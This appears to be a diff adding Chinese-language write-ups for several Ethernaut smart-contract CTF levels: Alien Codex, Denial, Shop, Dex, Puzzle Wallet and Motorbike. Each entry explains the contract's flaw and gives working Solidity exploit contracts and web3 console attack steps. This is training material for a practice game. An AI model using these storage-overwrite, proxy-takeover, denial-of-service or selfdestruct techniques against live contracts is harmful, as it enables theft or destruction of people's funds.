@@ -460,7 +460,7 @@ contract Exploit {
 先通过 `#!js await getBalance(instance)` 得到目标合约中的 balance 为 0.001 ether，所以每次 withdraw 0.001 ether 就好
 
 ???+ done "exp"
-    ```
+    ```solidity
     // SPDX-License-Identifier: MIT
     pragma solidity ^0.6.0;
 
@@ -1073,6 +1073,600 @@ RETURN      ; 返回 runtime code
 ```
 其中 contract address 通过访问给出的 etherscan 的网址就可以查到创建的合约地址
 
-<!-- ---
+---
 
-##  -->
+## Alien Codex
+
+??? question "题目合约"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.5.0;
+
+    import '../helpers/Ownable-05.sol';
+
+    contract AlienCodex is Ownable {
+
+        bool public contact;
+        bytes32[] public codex;
+
+        modifier contacted() {
+            assert(contact);
+            _;
+        }
+        
+        function make_contact() public {
+            contact = true;
+        }
+
+        function record(bytes32 _content) contacted public {
+            codex.push(_content);
+        }
+
+        function retract() contacted public {
+            codex.length--;
+        }
+
+        function revise(uint i, bytes32 _content) contacted public {
+            codex[i] = _content;
+        }
+    }
+    ```
+
+要求拿到合约的所有权，这个 owner 的存储是在 Ownable 中定义的，它会和 contact 一起放在 storage 的 slot 0 处，目的就是改变这个位置的值
+
+而 slot 1 的位置开始就是 codex 的存储，先是长度。所以可以通过调用 retract() 函数来使 length 向下溢出变成 2**256-1，也就可以访问到全部的 storage 区域，所以就只需要找到 slot 0 对应的 codex[i] 的 i
+
+因为 codex[i] 实际上是表示 keccak256(slot of codex) + i 处，所以只要令 i = 2\*\*256 - keccak256(slot of codex) 就可以使其变为 2\*\*256，即溢出到 0 的位置
+
+而 codex 的 slot 就是 1，所以只需要计算 2\*\*256 - keccak256(1):
+```solidity
+contract Exploit {
+    function calc() public view returns (bytes32) {
+        return keccak256(abi.encode(bytes32(uint(1))));
+    }
+}
+```
+得到 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，用 2\*\*256 减去它得到 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
+
+然后更改这个位置到 player 地址就好了（要在地址前面补上一堆 0 和 contact）
+```js
+> contract.retract()
+> await web3.eth.getStorageAt(instance, 0)
+'0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
+> await web3.eth.getStorageAt(instance, 1)
+'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
+> contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0x000000000000000000000001<player address>")
+```
+
+---
+
+## Denial
+
+??? question "题目合约"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    import '@openzeppelin/contracts/math/SafeMath.sol';
+
+    contract Denial {
+
+        using SafeMath for uint256;
+        address public partner; // withdrawal partner - pay the gas, split the withdraw
+        address payable public constant owner = address(0xA9E);
+        uint timeLastWithdrawn;
+        mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+        function setWithdrawPartner(address _partner) public {
+            partner = _partner;
+        }
+
+        // withdraw 1% to recipient and 1% to owner
+        function withdraw() public {
+            uint amountToSend = address(this).balance.div(100);
+            // perform a call without checking return
+            // The recipient can revert, the owner will still get their share
+            partner.call{value:amountToSend}("");
+            owner.transfer(amountToSend);
+            // keep track of last withdrawal time
+            timeLastWithdrawn = now;
+            withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
+        }
+
+        // allow deposit of funds
+        receive() external payable {}
+
+        // convenience function
+        function contractBalance() public view returns (uint) {
+            return address(this).balance;
+        }
+    }
+    ```
+
+目的是要阻止 owner 在 withdraw 的时候提取到资产
+
+重入攻击没有打出来，但是可以通过让攻击合约的 fallback 触发 assert 异常，这样消耗掉所有的 gas 后就再没法正常向 owner 转账了
+
+???+ done "exp"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    /* code of Denial */
+
+    contract Exploit {
+        Denial challenge;
+        constructor(address payable addr) public {
+            challenge = Denial(addr);
+        }
+        function exp() public {
+            challenge.setWithdrawPartner(address(this));
+            challenge.withdraw();
+        }
+        receive() external payable {
+            assert(false);
+        }
+    }
+    ```
+
+---
+
+## Shop
+
+??? question "题目合约"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    interface Buyer {
+        function price() external view returns (uint);
+    }
+
+    contract Shop {
+        uint public price = 100;
+        bool public isSold;
+
+        function buy() public {
+            Buyer _buyer = Buyer(msg.sender);
+
+            if (_buyer.price() >= price && !isSold) {
+                isSold = true;
+                price = _buyer.price();
+            }
+        }
+    }
+    ```
+
+目的是使 price 小于 100。和 Elevator 类似，只要使两次调用 price 得到的值不一样就可以了
+
+???+ done "exp"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    /* code of Shop */
+
+    contract Exploit {
+        Shop challenge;
+        constructor(address addr) public {
+            challenge = Shop(addr);
+        }
+        function price() external view returns (uint) {
+            if (challenge.isSold()) {
+                return 90;
+            }
+            return 100;
+        }
+        function exp() public {
+            challenge.buy();
+        }
+    }
+    ```
+
+---
+
+## Dex & Dex Two
+
+??? question "题目合约"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+    import '@openzeppelin/contracts/math/SafeMath.sol';
+
+    contract Dex {
+        using SafeMath for uint;
+        address public token1;
+        address public token2;
+        constructor(address _token1, address _token2) public {
+            token1 = _token1;
+            token2 = _token2;
+        }
+
+        function swap(address from, address to, uint amount) public {
+            require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+            uint swap_amount = get_swap_price(from, to, amount);
+            IERC20(from).transferFrom(msg.sender, address(this), amount);
+            IERC20(to).approve(address(this), swap_amount);
+            IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
+        }
+
+        function add_liquidity(address token_address, uint amount) public{
+            IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+        }
+
+        function get_swap_price(address from, address to, uint amount) public view returns(uint){
+            return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+        }
+
+        function approve(address spender, uint amount) public {
+            SwappableToken(token1).approve(spender, amount);
+            SwappableToken(token2).approve(spender, amount);
+        }
+
+        function balanceOf(address token, address account) public view returns (uint){
+            return IERC20(token).balanceOf(account);
+        }
+    }
+
+    contract SwappableToken is ERC20 {
+        constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
+            _mint(msg.sender, initialSupply);
+        }
+    }
+    ```
+
+题意就是玩家账户上的 token1 和 token2 都各有 10 个 token，而题目账户上有 100 个，目的是把题目账户上的某个 token 清零
+
+题目的 Dex 合约主要提供了 swap 这个函数用来在两个 token 间交换金额。但是转出的时候先调用了 get_swap_price 来计算金额，而且在其中调用的是两方格子的 balanceOf 函数。因此可以构造一个新的 IERC20 的 token，让它的 balanceOf 始终返回 1，作为分母，这样转出的时候就会转出题目 token 中的所有余额了
+
+Dex Two 和 Dex 差别就在于 DexTwo 需要将两个 token 都置为 0，用 exp 函数分别打下 token1 和 token2 就行
+
+???+ done "exp"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+
+    /* code of Dex */
+
+    contract ExploitToken {
+        function balanceOf(address account) public view returns (uint256) {
+            return 1;
+        }
+        function transferFrom(address, address, uint256) public returns (bool) {
+            return true;
+        }
+    }
+
+    contract Exploit {
+        address token = address(new ExploitToken());
+        Dex challenge;
+        constructor(address addr) public {
+            challenge = Dex(addr);
+        }
+        function exp(address token1) public {
+            challenge.swap(token, token1, 1);
+        }
+    }
+    ```
+
+---
+
+## Puzzle Wallet
+
+??? question "题目合约"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.6.0;
+    pragma experimental ABIEncoderV2;
+
+    import "@openzeppelin/contracts/math/SafeMath.sol";
+    import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";
+
+    contract PuzzleProxy is UpgradeableProxy {
+        address public pendingAdmin;
+        address public admin;
+
+        constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
+            admin = _admin;
+        }
+
+        modifier onlyAdmin {
+            require(msg.sender == admin, "Caller is not the admin");
+            _;
+        }
+
+        function proposeNewAdmin(address _newAdmin) external {
+            pendingAdmin = _newAdmin;
+        }
+
+        function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
+            require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
+            admin = pendingAdmin;
+        }
+
+        function upgradeTo(address _newImplementation) external onlyAdmin {
+            _upgradeTo(_newImplementation);
+        }
+    }
+
+    contract PuzzleWallet {
+        using SafeMath for uint256;
+        address public owner;
+        uint256 public maxBalance;
+        mapping(address => bool) public whitelisted;
+        mapping(address => uint256) public balances;
+
+        function init(uint256 _maxBalance) public {
+            require(maxBalance == 0, "Already initialized");
+            maxBalance = _maxBalance;
+            owner = msg.sender;
+        }
+
+        modifier onlyWhitelisted {
+            require(whitelisted[msg.sender], "Not whitelisted");
+            _;
+        }
+
+        function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
+            require(address(this).balance == 0, "Contract balance is not 0");
+            maxBalance = _maxBalance;
+        }
+
+        function addToWhitelist(address addr) external {
+            require(msg.sender == owner, "Not the owner");
+            whitelisted[addr] = true;
+        }
+
+        function deposit() external payable onlyWhitelisted {
+            require(address(this).balance <= maxBalance, "Max balance reached");
+            balances[msg.sender] = balances[msg.sender].add(msg.value);
+        }
+
+        function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
+            require(balances[msg.sender] >= value, "Insufficient balance");
+            balances[msg.sender] = balances[msg.sender].sub(value);
+            (bool success, ) = to.call{ value: value }(data);
+            require(success, "Execution failed");
+        }
+
+        function multicall(bytes[] calldata data) external payable onlyWhitelisted {
+            bool depositCalled = false;
+            for (uint256 i = 0; i < data.length; i++) {
+                bytes memory _data = data[i];
+                bytes4 selector;
+                assembly {
+                    selector := mload(add(_data, 32))
+                }
+                if (selector == this.deposit.selector) {
+                    require(!depositCalled, "Deposit can only be called once");
+                    // Protect against reusing msg.value
+                    depositCalled = true;
+                }
+                (bool success, ) = address(this).delegatecall(data[i]);
+                require(success, "Error while delegating call");
+            }
+        }
+    }
+    ```
+
+题目比较复杂，最终目的是使 PuzzleProxy 的 admin 为 player
+
+因为 PuzzleProxy 和 PuzzleWallet 部署在同一个地址上，它们的 storage 会共用，所以就导致了 PuzzleProxy 的 pendingAdmin 对应了 PuzzleWallet 的 owner，PuzzleWallet 的 maxBalance 对应了 PuzzleProxy 的 admin
+
+从后往前推：
+
+- 要使 admin 变为 player，则可以设置 maxBalance 为 player
+- 而 setMaxBalance 函数需要先使当前合约账户的余额变为 0
+- 合约账户余额减少的方式在 execute 中的 call，使余额减少 value
+- 但这样要使 balances[player] >= value
+- 而通过 deposit 增加 balances[player] 的话，合约账户余额也会同步增加
+- 所以要使用 multicall 函数来使 balances[player] 增加量为合约账户余额增加量的二倍
+- 但是 multicall 中检测了 selector 使 deposit 只能调用一次
+- 这可以通过 multicall 中执行两个 multicall，每个 multicall 调用一次 deposit
+
+这样分析之后问题就解决了，首先调用 proposeNewAdmin 来使 pendingAdmin（owner）变为 player，这个函数不能直接调用，但是可以通过发送合约的方式调用
+```js
+> await web3.eth.getStorageAt(instance, 0)  // owner
+'0x000000000000000000000000<level address>'
+> web3.utils.sha3("proposeNewAdmin(address)").slice(0, 10)  // selector
+'0xa6376746'
+> data = web3.utils.sha3("proposeNewAdmin(address)").slice(0, 10) + player.slice(2).padStart(64, "0")
+'0xa6376746000000000000000000000000<player address>'
+> web3.eth.sendTransaction({from: player, to: instance, data: data})
+> await web3.eth.getStorageAt(instance, 0)
+'0x000000000000000000000000<player address>'
+```
+
+然后拿到 owner 后需要将自己加入白名单，并且先查询一下合约账户余额
+```js
+> await contract.addToWhitelist(player)
+> await getBalance(instance)
+'0.001'
+```
+
+所以需要构造一个 calldata，它会通过 multicall 调用 deposit，然后把两个这个 calldata 传入 multicall，同时附带 value 0.001 ether，这样 balances[player] 就会增加 0.002 ether，然后就可以通过 execute 直接提取出这 0.002 ether
+
+提取后合约账户的 balance 变为 0，就可以设置 maxBalance 了
+```js
+> web3.utils.sha3("deposit()").slice(0, 10) // deposit selector
+'0xd0e30db0'
+> data = (await contract.methods["multicall(bytes[])"].request(["0xd0e30db0"])).data // 构造通过 multicall 调用 deposit 的 calldata
+'0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000'
+> await contract.multicall([data, data], {value: toWei("0.001")})
+> await getBalance(instance)
+'0.002'
+> contract.execute(player, toWei("0.002"), 0
+> await getBalance(instance)
+'0'
+> await web3.eth.getStorageAt(instance, 1)
+'0x000000000000000000000000<level address>'
+> contract.setMaxBalance(player)
+> await web3.eth.getStorageAt(instance, 1)
+'0x000000000000000000000000<player address>'
+```
+
+---
+
+## Motorbike
+
+??? question "题目合约"
+    ```solidity
+    // SPDX-License-Identifier: MIT
+
+    pragma solidity <0.7.0;
+
+    import "@openzeppelin/contracts/utils/Address.sol";
+    import "@openzeppelin/contracts/proxy/Initializable.sol";
+
+    contract Motorbike {
+        // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+        bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+        
+        struct AddressSlot {
+            address value;
+        }
+        
+        // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
+        constructor(address _logic) public {
+            require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
+            _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
+            (bool success,) = _logic.delegatecall(
+                abi.encodeWithSignature("initialize()")
+            );
+            require(success, "Call failed");
+        }
+
+        // Delegates the current call to `implementation`.
+        function _delegate(address implementation) internal virtual {
+            // solhint-disable-next-line no-inline-assembly
+            assembly {
+                calldatacopy(0, 0, calldatasize())
+                let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
+                returndatacopy(0, 0, returndatasize())
+                switch result
+                case 0 { revert(0, returndatasize()) }
+                default { return(0, returndatasize()) }
+            }
+        }
+
+        // Fallback function that delegates calls to the address returned by `_implementation()`. 
+        // Will run if no other function in the contract matches the call data
+        fallback () external payable virtual {
+            _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
+        }
+        
+        // Returns an `AddressSlot` with member `value` located at `slot`.
+        function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
+            assembly {
+                r_slot := slot
+            }
+        }
+    }
+
+    contract Engine is Initializable {
+        // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
+        bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+        address public upgrader;
+        uint256 public horsePower;
+
+        struct AddressSlot {
+            address value;
+        }
+
+        function initialize() external initializer {
+            horsePower = 1000;
+            upgrader = msg.sender;
+        }
+
+        // Upgrade the implementation of the proxy to `newImplementation`
+        // subsequently execute the function call
+        function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
+            _authorizeUpgrade();
+            _upgradeToAndCall(newImplementation, data);
+        }
+
+        // Restrict to upgrader role
+        function _authorizeUpgrade() internal view {
+            require(msg.sender == upgrader, "Can't upgrade");
+        }
+
+        // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
+        function _upgradeToAndCall(
+            address newImplementation,
+            bytes memory data
+        ) internal {
+            // Initial upgrade and setup call
+            _setImplementation(newImplementation);
+            if (data.length > 0) {
+                (bool success,) = newImplementation.delegatecall(data);
+                require(success, "Call failed");
+            }
+        }
+        
+        // Stores a new address in the EIP1967 implementation slot.
+        function _setImplementation(address newImplementation) private {
+            require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
+            
+            AddressSlot storage r;
+            assembly {
+                r_slot := _IMPLEMENTATION_SLOT
+            }
+            r.value = newImplementation;
+        }
+    }
+    ```
+
+同样有些复杂，最终目的是要销毁掉 Engine
+
+因为整个合约中都没有 selfdestruct，所以要载入自己的合约，可以通过 upgradeToAndCall 函数来载入合约并调用，这需要通过 _authorizeUpgrade 函数的检查，也就是检查 sender 是否是 upgrader，而改变 upgrader 可以通过 initialize 函数来完成
+
+所以攻击流程就是先通过 getStorageAt 来得到部署的 Engine 的地址，然后调用 initialize，upgradeToAndCall 一个部署的新合约，让它触发 selfdestruct 就好了
+
+新合约：
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Exploit {
+    function exp() public {
+        selfdestruct(payable(0));
+    }
+}
+```
+
+攻击流程：
+```js
+> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
+'0x000000000000000000000000<engine address>'
+> engine = "0x<engine address>"
+> data = web3.utils.sha3("initialize()").slice(0, 10)
+'0x8129fc1c'
+> web3.eth.sendTransaction({from: player, to: engine, data: data})
+> await web3.eth.call({from: player, to: engine, data: web3.utils.sha3("upgrader()").slice(0, 10)}) // 验证 upgrader
+'0x000000000000000000000000<player address>'
+> exp = "<Exploit contract address>"
+> expdata = web3.utils.sha3("exp()").slice(0, 10)
+'0xab60ffda'
+> signature = {
+    name: 'upgradeToAndCall',
+    type: 'function',
+    inputs: [
+        {
+            type: 'address',
+            name: 'newImplementation'
+        },
+        {
+            type: 'bytes memory',
+            name: 'data'
+        }
+    ]
+}
+{name: 'upgradeToAndCall', type: 'function', inputs: Array(2)}
+> data = web3.eth.abi.encodeFunctionCall(upgradeSignature, [exp, expdata])
+'0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000'
+> web3.eth.sendTransaction({from: player, to: engine, data: data})
+```
